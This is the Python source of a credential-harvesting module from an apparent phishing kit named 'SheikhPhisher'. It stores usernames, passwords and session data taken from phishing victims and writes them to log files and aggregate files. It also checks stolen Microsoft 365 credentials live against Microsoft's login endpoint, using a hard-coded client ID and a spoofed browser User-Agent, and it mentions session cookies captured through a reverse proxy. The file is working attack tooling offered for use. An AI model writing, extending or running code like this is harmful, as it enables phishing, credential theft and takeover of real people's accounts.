#!/usr/bin/env python3
# modules/harvester.py - SheikhPhisher Credential & Session Harvester

import os, json, logging, hashlib, requests
from datetime import datetime

log = logging.getLogger(__name__)

class CredentialHarvester:
    """Captures, validates, and stores credentials and session tokens"""
    
    def __init__(self, config):
        self.config = config
        self.output_dir = config.get('capture', {}).get('output_dir', './captures')
        self.auto_validate = config.get('capture', {}).get('auto_validate', False)
        os.makedirs(self.output_dir, exist_ok=True)
    
    def save(self, record):
        """Save captured data to disk"""
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        hash_id = hashlib.md5(json.dumps(record.get('credentials', {})).encode()).hexdigest()[:8]
        filename = f"{timestamp}_{record.get('session_id', 'unknown')[:8]}_{hash_id}.json"
        filepath = os.path.join(self.output_dir, filename)
        
        # Anonymize IP if configured
        if not self.config.get('capture', {}).get('store_ips', True):
            record['ip'] = 'REDACTED'
        
        with open(filepath, 'w') as f:
            json.dump(record, f, indent=2)
        
        log.info(f"[+] CREDENTIALS CAPTURED: {record.get('credentials', {})}")
        log.info(f"[+] Saved to: {filepath}")
        
        # Also append to aggregate file for easy review
        agg_file = os.path.join(self.output_dir, 'all_captures.jsonl')
        with open(agg_file, 'a') as f:
            f.write(json.dumps(record) + '\n')
        
        return filepath
    
    def validate_against_api(self, record):
        """Validate captured credentials against the real service API"""
        creds = record.get('credentials', {})
        template = record.get('template', '')
        username = creds.get('username') or creds.get('email') or creds.get('login') or ''
        password = creds.get('password') or creds.get('session_password') or ''
        
        if not username or not password:
            log.warning("[VALIDATE] Missing username or password, skipping validation")
            return None
        
        log.info(f"[VALIDATE] Attempting to validate: {username}")
        
        # This would attempt real API validation - implementation depends on target
        # For Microsoft 365:
        if 'microsoft' in template or '365' in template:
            return self._validate_o365(username, password, creds)
        elif 'gmail' in template or 'google' in template:
            return self._validate_google(username, password)
        
        return {'valid': 'unknown', 'message': 'No validator for this template'}
    
    def _validate_o365(self, username, password, extra_creds=None):
        """Validate against Microsoft Online (simulated)"""
        try:
            # Attempt to get token from login.microsoftonline.com
            # This uses OAuth2 resource owner flow for validation
            data = {
                'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',  # Office 365 client ID
                'resource': 'https://graph.windows.net',
                'username': username,
                'password': password,
                'grant_type': 'password',
            }
            
            # Add MFA code if present
            mfa = extra_creds.get('mfa_code') or extra_creds.get('otp') if extra_creds else None
            if mfa:
                # Would require different flow for MFA
                pass
            
            resp = requests.post(
                'https://login.microsoftonline.com/common/oauth2/token',
                data=data,
                timeout=10,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if resp.status_code == 200:
                tokens = resp.json()
                record = {
                    'valid': True,
                    'access_token': tokens.get('access_token', '')[:50] + '...',
                    'token_type': tokens.get('token_type', ''),
                    'expires_in': tokens.get('expires_in'),
                    'tenant_id': tokens.get('tenant', ''),
                    'message': 'Credentials validated successfully against Microsoft Online'
                }
                log.info(f"[VALIDATE] ✓ VALID - {username}")
                self._save_validation(username, record)
                return record
            else:
                error = resp.json().get('error_description', resp.text)
                record = {'valid': False, 'message': f'Invalid: {error}'}
                log.warning(f"[VALIDATE] ✗ INVALID - {username}: {error}")
                return record
                
        except Exception as e:
            log.error(f"[VALIDATE] Error validating {username}: {e}")
            return {'valid': 'error', 'message': str(e)}
    
    def _validate_google(self, username, password):
        """Validate against Google (simulated validation)"""
        # Google requires oauth flow, not direct password validation
        # This would be used with session tokens captured via reverse proxy
        log.info(f"[VALIDATE] Google validation requires session tokens (captured via proxy mode)")
        return {'valid': 'session_required', 'message': 'Use captured session cookies to validate'}
    
    def _save_validation(self, username, result):
        """Save validation results"""
        val_file = os.path.join(self.output_dir, 'validated_creds.jsonl')
        with open(val_file, 'a') as f:
            f.write(json.dumps({
                'timestamp': datetime.utcnow().isoformat(),
                'username': username,
                'valid': result.get('valid'),
                'details': result.get('message', '')
            }) + '\n')